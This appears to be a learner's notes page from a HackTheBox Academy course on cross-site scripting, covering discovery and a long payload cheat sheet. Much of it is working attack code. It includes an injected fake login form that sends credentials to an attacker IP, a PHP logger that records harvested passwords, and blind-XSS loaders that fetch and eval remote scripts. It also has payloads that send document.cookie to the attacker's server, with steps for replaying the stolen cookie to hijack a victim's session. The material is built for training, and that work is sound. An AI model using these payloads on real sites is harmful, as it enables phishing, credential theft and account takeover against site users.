## Stored XSS

#### Basic XSS Payload
```html
<script>alert(window.origin)</script>
```

#### Basic XSS Payload w/ Filter Bypass
```HTML
'><script>alert(document.cookie)</script>'
```


#### Print Dialog Box XSS Payload
```html
<script>print()</script>
```

#### Plaintext XSS Payload
```html
<plaintext>alert(window.origin)</plaintext>
```

#### Acquiring a Cookie with XSS
```html
<script>alert(document.cookie)</script>
```

## Reflected XSS

Same payloads as Stored. To use this, look at it in the Inspector Tools and Network tab, then `Copy>Copy URL` the GET/POST request and send to user. When they visit the URL, the payload will execute.

## DOM-based XSS

If we open the `Network` tab in the Firefox Developer Tools, and re-add the `test` item, we would notice that no HTTP requests are being made.

If we look at the page source by hitting [CTRL+I], we will notice that our test string is nowhere to be found.

Commonly used JavaScript functions to write to DOM objects are:
- `document.write()`
- `DOM.innerHTML` (e.g., `getElementById("todo").innerHTML`)
- `DOM.outerHTML`
- `document.writeIn()`
- `document.domain()`

`jQuery` library functions that write to DOM objects:
- `add()`
- `after()`
- `append()`
- `html()`
- `parseHTML()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

If a Sink function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.

#### E.g.
We can look at the source code of the To-Do web application, and check script.js, and we will see that the Source is being taken from the task= parameter:
```JavaScript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Right below these lines, we see that the page uses the innerHTML function to write the task variable in the todo DOM:
```JavaScript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

We can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.

#### XSS Payload w/o `<script>` tag
```html
<img src="" onerror=alert(window.origin)>
```
Displays page URL

#### XSS Payload w/o `<script>` tag
```html
<img src="" onerror=alert(document.cookie)>
```

## XSS Discovery

### Automated Discovery

#### Run xsstrike on a url parameter
```Shell
python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

***Also: BruteXSS and XSSer***

### Manual Discovery

#### Lists:
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)

***Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).*

### Code Review

- [Secure Coding 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript)
- [Whitebox Pentesting 101: Command Injection](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection)

***LAB:*

URL was vulnerable after valid data was entered into the required fields.

Payload was inserted where the email parameter was located in the URL:

## Phishing

### First, discover a working XSS Payload

### Login Form Injection

#### Basic HTML Login Form
```html
<h3>Please login to continue</h3>
<form action=http://YOUR_IP>
	<input type="username" name="username" placeholder="Username">
	<input type="password" name="password" placeholder="Password">
	<input type="submit" name="submit" value="Login">
</form>
```

#### JavaScript Function to write login form to page: `document.write()`
```HTML
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>'
```
***LAB NOTE:* *Make sure your quotation marks are correct. Everything inside `document.write`'s parentheses should be green.*

#### Remove page elements (e.g., Image URL field)
`JavaScript Function`:
```JavaScript
document.getElementById().remove()
```
To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking [CTRL+SHIFT+C] and then clicking on the element we need
![[Pasted image 20230128113321.png]]
As we see in both the source code and the hover text, the url form has the id urlform:
```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

`XSS Payload`:
```html
'><script>document.getElementById('urlform').remove();</script>'
```
Add to previous payload so you have the fake login form on the screen

`Full XSS Payload`:
```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>'
```
![[Pasted image 20230128113738.png]]

We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.16.18><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```
![[Pasted image 20230128114014.png]]

### Credential Stealing

#### Start a netcat listener on port 80
```Shell
nc -lnvp 80
```

Once someone enters their credentials into the login form, you'll receive them in plaintext over netcat:
![[Creds Grabbed 1.png]]

#### BETTER OPTION: PHP Server
`PHP script to write to location on VM (e.g., /tmp/tmpserver/index.php`:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.214.98/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

#### Start PHP Listener
```Shell
php -S 0.0.0.0:80
```
![[Creds Grabbed -php.png]]

![[txt creds.png]]


## Session Hijacking

### Blind XSS Detection

Examples of forms that may contain blind XSS

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

#### Make a fake user and submit it to see how the form handles the data

#### To detect Blind XSS, use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

### Loading a Remote Script

#### Include a remote script by providing its URL
```html
<script src="http://OUR_IP/script.js"></script>
```

#### Identify the vulnerable input field that executed the script
```html
<script src="http://OUR_IP/username"></script>
```

#### Blind XSS Payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
```html
<script src=http://OUR_IP></script>
```

```html
'><script src=http://OUR_IP></script>
```

```html
"><script src=http://OUR_IP></script>
```

```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```html
<script>$.getScript("http://OUR_IP")</script>
```

#### Start a Listener on the VM
```Shell
mkdir /tmp/tmpserver
cd /tmp/tmpserver
php -S 0.0.0.0:80
```

#### Start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP
```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```
Once we submit the form, we wait a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload, and so on.

*Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.*

***LAB Payload:*

Testing for Blind XSS:
```html
"><script src=http://10.10.16.18/imgurl></script>
```
![[blind xss payload.png]]

### Session Hijacking

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

#### JavaScript payloads that grab the session cookie and send it to our PHP server
```JavaScript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

#### Create the `script.js` payload on your VM
```JavaScript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
Image payloads look less suspicious

#### Change the URL in the XSS payload we found earlier to use script.js
```html
<script src=http://OUR_IP/script.js></script>
```

***LAB Payload:*
```html
"><script src=http://10.10.16.18/script.js></script>
```

#### PHP Script to Sort Cookies
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['http://10.129.214.170/hijacking/index.php']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

#### Use the cookie on the `login.php` page to access the victim's account
- [Shift+F9] (`Storage` bar in Developer Tools)
- Click on `+` in the top right corner to add the cookie, where `Name` is the part before `=` and the `Value` is the part after `=` from the stolen cookie
![[Pasted image 20230128142859.png]]
- Refresh the page to gain access

## XSS Payloads

#### Basic XSS Payload
```html
<script>alert(window.origin)</script>
```

#### Basic XSS Payload w/ Filter Bypass
```HTML
'><script>alert("XSS!")</script>'
```

#### Print Dialog Box XSS Payload
```html
<script>print()</script>
```

#### Plaintext XSS Payload
```html
<plaintext>alert(window.origin)</plaintext>
```

#### Acquiring a Cookie with XSS
```html
<script>alert(document.cookie)</script>
```

#### XSS Payload w/o `<script>` tag
```html
<img src="" onerror=alert(window.origin)>
```
Displays page URL

#### XSS Payload w/o `<script>` tag
```html
<img src="" onerror=alert(document.cookie)>
```

#### Change Background Color
```html
<script>document.body.style.background = "#141d2b"</script>
```

#### Change Background Image
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

#### Change Website Title
```HTML
<script>document.title = 'HackTheBox Academy'</script>
```

#### Overwrite Website's Main Body
```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```
Must have `jQuery` library imported within the page source: `$("#todo").html('New Text');`

##### Prepare the HTML code locally
```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

##### Insert in parameter in single line as part of the XSS payload
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

#### Remove certain HTML element
```html
<script>document.getElementById('urlform').remove();</script>
```

#### Load remote script
```html
<script src="http://OUR_IP/script.js"></script>
```

#### Send Cookie details to us
```html
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```

#### Include a remote script by providing its URL
```html
<script src="http://OUR_IP/script.js"></script>
```

#### Identify the vulnerable input field that executed the script
```html
<script src="http://OUR_IP/username"></script>
```

#### Blind XSS Payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
```html
<script src=http://OUR_IP></script>
```

```html
'><script src=http://OUR_IP></script>
```

```html
"><script src=http://OUR_IP></script>
```

```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```html
<script>$.getScript("http://OUR_IP")</script>
```

